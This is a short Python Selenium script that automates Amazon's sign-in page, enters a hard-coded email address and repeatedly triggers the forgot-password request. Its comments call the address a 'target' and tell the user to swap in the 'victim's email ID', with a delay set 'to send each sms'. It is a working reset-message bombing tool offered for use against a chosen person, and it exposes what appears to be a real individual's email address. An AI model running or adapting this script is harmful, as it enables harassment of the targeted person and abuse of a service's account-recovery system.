from selenium import webdriver 
from selenium.webdriver.common.keys import Keys 
import time 

for i in range(2):
    # create instance of Chrome webdriver 
    driver=webdriver.Chrome()  
    driver.get("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3F_encoding%3DUTF8%26ref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0")

    # find the element where we have to   
    # enter the xpath 
    # target mobile number, change it to victim's email ID and  
    # also ensure that it's registered on amazon
    driver.find_element("xpath", '//*[@id="ap_email"]').send_keys('bit2topriya@gmail.com')
    #driver.find_element("xpath", '//*[@id="mG61Hd"]/div[2]/div/div[2]/div[1]/div/div/div[2]/div/div[1]/div/div[1]/input')
    
    # find the element continue  
    # request using xpath  
    # clicking on that element  
    driver.find_element("xpath", '//*[@id="continue"]').click() 
    
    # find the element to send a forgot password  
    # request using xpath
    driver.find_element("xpath", '//*[@id="auth-fpp-link-bottom"]').click()
    driver.find_element("xpath", '//*[@id="continue"]').click()

    # set the interval to send each sms 
    time.sleep(4) 

    #Close the insatnce of chrome browser
    driver.close()
    